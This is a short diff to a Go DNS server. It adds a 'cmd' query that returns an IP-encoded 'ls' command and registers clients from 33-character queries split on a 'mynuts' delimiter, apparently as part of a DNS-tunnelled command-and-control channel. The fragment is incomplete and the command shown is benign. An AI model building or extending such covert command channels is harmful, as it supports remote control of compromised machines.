@@ -59,13 +59,21 @@ func incoming(query string) []string {
 	switch query {
 	case "ping":
 		return ipencode("fingerprint")
+	case "cmd":
+		return ipencode("ls")
+	default:
+		if len(query) == 33 {
+			(&serv).clients[strings.Split(query, "mynuts")[1]] = client{strings.Split(query, "mynuts")[1], []string{}, "0.0.0.0"}
+		}
+		return ipencode(fmt.Sprintf("Hello %s, How are you?", query))
 	}
-	return ipencode(fmt.Sprintf("Hello %s, How are you?", query))
 }
 
 func Serve(port int) server {
-	// Start the DNS server
-	go DNS(port)
+	serv = server{}
 
-	return server{}
+	// Start the DNS server
+	go DNS(port, serv)
+
+	return serv
 }
